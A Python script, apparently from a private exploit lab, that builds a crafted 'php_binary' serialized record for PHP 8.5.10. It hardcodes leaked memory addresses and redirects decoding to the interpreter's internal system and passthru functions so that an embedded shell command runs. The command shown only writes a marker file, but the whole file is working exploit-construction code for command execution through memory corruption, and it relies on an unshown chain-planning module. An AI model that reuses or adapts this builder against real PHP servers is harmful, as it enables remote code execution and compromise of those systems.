#!/usr/bin/env python3
"""Build the G6 php_binary_zif record for the private PIE 8.5.10 lab.

Uses phpshell/tool/modules/g2_chain.py plan_zif with a lab-specific profile,
then patches the fake var_dtor_entries.used_slots to 0 for the dry (K=0) run.

The final record's F pointer depends on X2 (the forced END decode buffer).
Pass --x2 with the measured value; the dry record is identical except
used_slots=0 so hit2 runs the normal php_binary decoder.
"""
import json
import struct
import sys
from pathlib import Path

MOD = Path('/home/davide/ailocal/php/phpshell/tool/modules')
sys.path.insert(0, str(MOD))
import g2_chain  # noqa: E402

R = Path('/tmp/opencode/research/php8pie_20261022_0325')
PROFILE = R / 'phase/profile_pie8510.json'

BASE = 0x556e4a800000
X1 = 0x7f65f526a000
P = 0x7f65f5282000
B0 = 0x7f65f5285000
TOTAL = 131014
TARGET = BASE + 0x10c1980
CMD = b'echo PIE_ZIF > /tmp/opencode/research/php8pie_20261022_0325/run/M_ZIF;#'


def build(x2, mode):
    profile = json.loads(PROFILE.read_text())
    # g2_chain plan_zif writes profile['zif_passthru'] verbatim; the profile
    # stores image offsets, so substitute the runtime addresses for this run.
    profile['zif_system'] = BASE + 0x464c05
    profile['zif_passthru'] = BASE + 0x464c15
    plan = g2_chain.plan(
        x=X1, p=P, b0=B0, total=TOTAL, command=CMD, target=TARGET,
        profile=profile, profile_path=PROFILE, decode='zif_passthru', x2=x2,
    )
    rec = bytearray(plan['record'])
    q = plan['geometry']['payload_start']
    b_idx = plan['geometry']['b_idx']
    used = plan['used_slots']
    injected = used
    if mode == 'dry':
        struct.pack_into('<q', rec, q + b_idx, 0)
        injected = 0
    out = R / ('phase/rec_zif_%s.bin' % mode)
    out.write_bytes(rec)
    meta = {
        'out': str(out), 'mode': mode, 'size': len(rec),
        'x2': hex(x2), 'F': hex(x2 + 0x18 + q + 0x100),
        'target': hex(TARGET), 'used_slots': used, 'injected_K': injected,
        'Q': q, 'L': plan['geometry']['length'],
        'rec1_len': plan['geometry']['rec1_len'],
        'p_idx': plan['geometry']['p_idx'], 'b_idx': b_idx,
        'zif': plan['checks'][1]['detail'],
    }
    (R / ('phase/rec_zif_%s.json' % mode)).write_text(json.dumps(meta, indent=1))
    print(json.dumps(meta, indent=1))
    return rec


def main():
    mode = sys.argv[1]
    x2 = int(sys.argv[2], 0)
    build(x2, mode)


if __name__ == '__main__':
    main()
